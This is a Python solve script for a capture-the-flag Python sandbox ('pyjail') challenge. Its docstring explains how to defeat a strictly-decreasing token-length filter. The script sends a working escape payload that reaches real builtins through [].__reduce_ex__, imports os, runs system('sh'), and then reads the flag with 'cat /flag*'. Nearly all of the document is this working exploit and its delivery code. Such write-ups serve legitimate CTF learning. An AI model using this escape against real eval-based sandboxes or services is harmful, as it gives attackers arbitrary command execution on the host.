#!/usr/bin/env python3
"""decreasing - AlpacaHack Daily (misc/pyjail, Hard).

jail.py eval()s <=100 ASCII chars under {"__builtins__": {}}, but only if the
lengths of all `\\w+` tokens are STRICTLY DECREASING left-to-right. The usual
escapes fail that rule:
  - ().__class__.__base__.__subclasses__()  -> 9,8,14 (increase at 14)
  - (x for x in()).gi_frame.f_back...       -> genexpr's `for`(3)/target/`in`(2)

Instead use copyreg.__newobj__ (a real Python function, preloaded because `re`
was imported). Its `.__builtins__` is copyreg's real builtins:

    [].__reduce_ex__(2)[0].__builtins__['__import__']('os').system('sh')

To satisfy the decreasing rule, build the ints 2 and 0 from symbols only and
pad the import name so tokens decrease 13>12>10>8>7>6>2:

    [].__reduce_ex__(-~([]==[]))[[]!=[]].__builtins__['__import__']('osXXXXXX'[:0x00002]).system('sh')

That spawns sh on the socket; we then send `cat /flag*` to read the flag.
Usage: python3 -I solve.py HOST PORT
"""
import re
import socket
import sys

HOST = sys.argv[1] if len(sys.argv) > 1 else "127.0.0.1"
PORT = int(sys.argv[2]) if len(sys.argv) > 2 else 1337

PAYLOAD = b"[].__reduce_ex__(-~([]==[]))[[]!=[]].__builtins__['__import__']('osXXXXXX'[:0x00002]).system('sh')"

s = socket.create_connection((HOST, PORT), timeout=20)
s.settimeout(6)
buf = b""
try:
    while b"code>" not in buf:
        buf += s.recv(4096)
    s.sendall(PAYLOAD + b"\n")        # breaks out of the jail into sh
    s.sendall(b"cat /flag*\n")         # read the flag through the shell
    data = b""
    while True:
        try:
            chunk = s.recv(4096)
        except socket.timeout:
            break
        if not chunk:
            break
        data += chunk
finally:
    s.close()

m = re.search(rb"Alpaca\{[^}]*\}", data)
print(m.group(0).decode() if m else "[no flag]\n" + data.decode(errors="replace"))
